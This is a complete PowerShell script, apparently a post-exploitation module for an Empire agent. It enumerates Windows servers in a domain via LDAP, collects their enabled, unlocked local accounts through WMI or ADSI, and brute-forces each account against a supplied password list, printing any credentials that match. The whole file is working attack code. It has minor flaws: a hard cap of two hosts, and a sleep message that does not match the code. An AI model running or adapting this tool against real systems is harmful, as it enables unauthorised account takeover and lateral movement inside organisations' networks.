#requires -Version 2.0

<#
        .SYNOPSIS
        Query for and brute force users on local (member) servers.
        .DESCRIPTION
        Use this script to query the local users of a member server (using known credentials, such as domain credentials) and to brute force the accounts using your own password list.
        .EXAMPLE
        C:\PS> C:\temp\Get-and-Brute-LocalAccount.ps1
        .NOTES
        Author     : Maarten Hartsuijker - @classityinfosec
#>
function Fetch-Brute
{

  Param
  (
        [Parameter(Position=0,Mandatory=$false)]
        [ValidateNotNullorEmpty()]
        [Alias('cn')][String[]]$ComputerName=$Env:COMPUTERNAME,
        [Parameter(Position=1,Mandatory=$false)]
        [Alias('un')][String[]]$AccountName,
        [Parameter(Position=2,Mandatory=$false)]
        [Alias('vbose')][String[]]$vbse,
        [Parameter(Position=3,Mandatory=$false)]
        [Alias('lacc')][String]$loginacc,
        [Parameter(Position=4,Mandatory=$false)]
        [Alias('lpass')][String]$loginpass,
        [Parameter(Position=5,Mandatory=$false)]
        [Alias('pl')][string[]]$passlist,
        [Parameter(Position=6,Mandatory=$false)]
        [Alias('st')][String[]]$servertype
  )

  # Create login credentials if account and password have been specified
  if ($loginacc -and $loginpass) {
    $secpasswd = ConvertTo-SecureString $loginpass -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential ($loginacc, $secpasswd)
  }

  # defining some variables
  if (!$servertype) { $objecttype="Window*Server*" } else { $objecttype=$servertype }
  $foundpwd = 0
  $verbose="$vbse"

  # fetching servers in domain within the defined scope (server types)
  $lijst = New-Object System.Collections.ArrayList
  $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
  $objSearcher.Filter = "(OperatingSystem=$objecttype)"
  "Name","canonicalname","distinguishedname" | Foreach-Object {$null = $objSearcher.PropertiesToLoad.Add($_) }
  $hostlijst = $objSearcher.FindAll() | Select-Object @{n='Name';e={$_.properties['name']}} | select -expandproperty name -first 2
  Write-Output "Discovered hosts: $hostlijst"

  # Get the accounts with each server, using available credentials
  foreach ($hostname in $hostlijst) {
    if ($verbose) {Write-Output "Fetching accounts for: $hostname"}
    $AllLocalAccounts="";
    $accnaam = "";
    $adsihit=0
    $Obj = @()

    # Query for local users using WMI (faster than ADSI)
    If($Credential)
    {
      try
      {
        if ($verbose) {Write-Output "Try WMI using credentialed"}
          $AllLocalAccounts = Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" `
          -Filter "LocalAccount='$True'" -ComputerName $hostname -Credential $Credential -ErrorAction Stop
      }
      catch
      { if ($verbose) {Write-Output "WMI supplied credentialled error"} }
    }
    else
    {
      try
      {
        if ($verbose) {Write-Output "Try WMI using agent credentials"}
          $AllLocalAccounts = Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" `
          -Filter "LocalAccount='$True'" -ComputerName $hostname -ErrorAction SilentlyContinue
      }
      catch
      { if ($verbose) {Write-Output "WMI agent credentials error"} }
    }
    if ($AllLocalAccounts) { if ($verbose) {Write-Output "WMI accounts found: $AllLocalAccounts"} }

    # sometimes, ADSI is available, where WMI isn't. ADSI will try using the user the empire agent is running as
    if (!$AllLocalAccounts)
    {
      try
      {
        if ($verbose) {Write-Output "Retry using ADSI (agent credentials)"}
        $adsihit = 1
        $adsi = [ADSI]"WinNT://$hostname"
        $AllLocalAccounts = $adsi.psbase.children | where {$_.psbase.schemaClassName -match "user"} | select @{n="Name";e={$_.name}} |Select-Object -ExpandProperty Name
        if ($verbose) {$AllLocalAccounts}
      }
      catch
      { if ($verbose) {Write-Output "ADSI Error"} }

    }

    Foreach($LocalAccount in $AllLocalAccounts)
    {
      # Don't include disabled and locked accounts (todo when using ADSI)
      if (($LocalAccount.Disabled -Match "False") -and ($LocalAccount.Lockout -Match "False") -and ($adsihit -Match 0))
      {
        $accnaam = $LocalAccount.Name
        $lijst.add($hostname+":"+$accnaam)
      }
      Elseif ($adsihit -gt 0)
      {
        $accnaam = $LocalAccount
        $noout = $lijst.add($hostname+":"+$accnaam)
      }
      Else
      { continue }
    }
  }

  # Start Brute force
  $hostcounter = $hostlijst.Count
  $acccounter = $lijst.Count
  Write-Output "Starting Brute Force for $hostcounter hosts and $acccounter accounts"

  If($lijst)
  {
      Foreach($hit in $lijst)
        {
        $hname,$uname = $hit.split(':')

        # Connect to machine
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        Try
        {
          $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $hname)
          $success = $true
        }
        Catch
        {
          $message = "Unable to contact Host"
          $success = $false
        }

        # If connected... Try passwords from the array
        if($success -ne $false)
        {
          foreach ($password in $passlist)
          {
            Try
            {
              Write-Verbose "Checking $uname : $password (then sleeping for 1 seconds)"
              $success = $principalContext.ValidateCredentials($uname, $password)
              $message = "Password Match"
              if ($success -eq $true)
              {
                Write-Output "Match found! $uname : $password"
                $foundpwd++
              }
              else
              {
                if ($verbose) { Write-Output "NO $hname - $uname : $password" }
              }
            }
            Catch
            {
              $success = $false
              $message = "Password doesn't match"
            }
              Start-Sleep -Seconds 0.1
            }
          }
        else
        {
            if ($verbose) { Write $message }
        }
      }
  }
  Write-Output "Found $foundpwd valid credentials"

}
